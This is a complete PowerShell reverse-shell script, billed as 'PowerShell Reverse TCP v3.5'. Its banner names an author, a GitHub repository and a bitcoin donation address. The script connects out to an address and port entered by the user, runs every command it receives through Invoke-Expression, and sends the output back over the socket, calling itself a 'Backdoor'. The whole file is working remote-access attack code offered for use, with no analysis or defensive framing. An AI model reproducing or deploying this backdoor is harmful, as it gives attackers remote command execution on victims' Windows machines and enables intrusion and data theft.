$addr = $(Read-Host -Prompt "Enter address").Trim();
Write-Host "";
$port = $(Read-Host -Prompt "Enter port number").Trim();
Write-Host "";
if ($addr.Length -lt 1 -or $port.Length -lt 1) {
	Write-Host "Both parameters are required";
} else {
	Write-Host "########################################################################";
	Write-Host "#                                                                      #";
	Write-Host "#                        PowerShell Reverse TCP v3.5                   #";
	Write-Host "#                                          by Ivan Sincek              #";
	Write-Host "#                                                                      #";
	Write-Host "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
	Write-Host "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
	Write-Host "#                                                                      #";
	Write-Host "########################################################################";
	$client = $null;
	$stream = $null;
	$buffer = $null;
	$writer = $null;
	$data = $null;
	$result = $null;
	try {
		$client = New-Object Net.Sockets.TcpClient($addr, $port);
		$stream = $client.GetStream();
		$buffer = New-Object Byte[] 1024;
		$encoding = New-Object Text.AsciiEncoding;
		$writer = New-Object IO.StreamWriter($stream);
		$writer.AutoFlush = $true;
		Write-Host "Backdoor is up and running...";
		Write-Host "";
		$bytes = 0;
		do {
			$writer.Write("PS>");
			do {
				$bytes = $stream.Read($buffer, 0, $buffer.Length);
				if ($bytes -gt 0) {
					$data = $data + $encoding.GetString($buffer, 0, $bytes);
				}
			} while ($stream.DataAvailable);
			if ($bytes -gt 0) {
				$data = $data.Trim();
				if ($data.Length -gt 0) {
					try {
						$result = Invoke-Expression -Command $data 2>&1 | Out-String;
					} catch {
						$result = $_.Exception | Out-String;
					}
					Clear-Variable -Name "data";
					$length = $result.Length;
					if ($length -gt 0) {
						$count = 0;
						do {
							if ($length -ge $buffer.Length) { $bytes = $buffer.Length; } else { $bytes = $length; }
							$writer.Write($result.substring($count, $bytes));
							$count += $bytes;
							$length -= $bytes;
						} while ($length -gt 0);
						Clear-Variable -Name "result";
					}
				}
			}
		} while ($bytes -gt 0);
		Write-Host "Backdoor will now exit...";
	} catch {
		Write-Host $_.Exception.InnerException.Message;
	} finally {
		if ($writer -ne $null) {
			$writer.Close();
			$writer.Dispose();
			Clear-Variable -Name "writer";
		}
		if ($stream -ne $null) {
			$stream.Close();
			$stream.Dispose();
			Clear-Variable -Name "stream";
		}
		if ($client -ne $null) {
			$client.Close();
			$client.Dispose();
			Clear-Variable -Name "client";
		}
		if ($buffer -ne $null) {
			$buffer.Clear();
			Clear-Variable -Name "buffer";
		}
		if ($result -ne $null) {
			Clear-Variable -Name "result";
		}
		if ($data -ne $null) {
			Clear-Variable -Name "data";
		}
		[System.GC]::Collect();
	}
}
